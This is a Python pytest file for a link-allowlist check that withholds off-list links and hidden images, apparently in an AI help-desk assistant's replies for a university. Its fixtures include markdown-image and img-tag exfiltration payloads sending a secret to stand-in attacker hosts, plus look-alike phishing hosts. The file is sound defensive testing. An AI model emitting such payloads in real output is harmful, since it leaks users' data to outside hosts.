"""Tests for Layer 2d: links outside the allowlist (and hidden images) are withheld. Fake data only."""
import pytest

from checks.link_allowlist import LinkAllowlistCheck, link_problem
from checks.test_hardening import CTX


@pytest.mark.parametrize("text", [
    "![](https://attacker.test/?d=SECRET)",                                    # markdown image exfiltration
    "Here you go ![logo](//evil.example-cdn.xyz/p.png?k=abc)",
    '<img src="https://collector.attacker.io/x?d=abc">',
    "Reset it at https://passwordreset.salisbury.edu/ now.",                    # made-up SU sub-site
    "Go to wifi.salisbury.edu and log in.",                                     # bare host, no https
    "Log in at http://192.168.10.5/admin",                                      # raw IP address
    "Open [the portal](https://gull-portal.internal/login).",
    "Visit https://support.microsoft.com.evil.test/reset",                      # look-alike host
])
def test_bad_links_are_withheld(text):
    assert link_problem(text)
    assert LinkAllowlistCheck().evaluate(text, CTX).is_violation


@pytest.mark.parametrize("text", [
    "Open a ticket at https://support.center.salisbury.edu/ or call 410-677-5454.",
    "See the knowledge base: https://su-support.atlassian.net/wiki/spaces/TSC/",
    "Microsoft's guide: https://support.microsoft.com/en-us/account-billing",
    "Download drivers from support.dell.com or www.nvidia.com.",
    "Email me at someone@salisbury.edu or helpdesk@attacker.test.",               # e-mail addresses are ignored
    "Use the file report.pdf and the script setup.exe.",
    "The domain in the example is example.com.",
    "Press Ctrl + P, then choose Campus_Wide_Printer.",
])
def test_good_links_pass(text):
    assert not link_problem(text), text
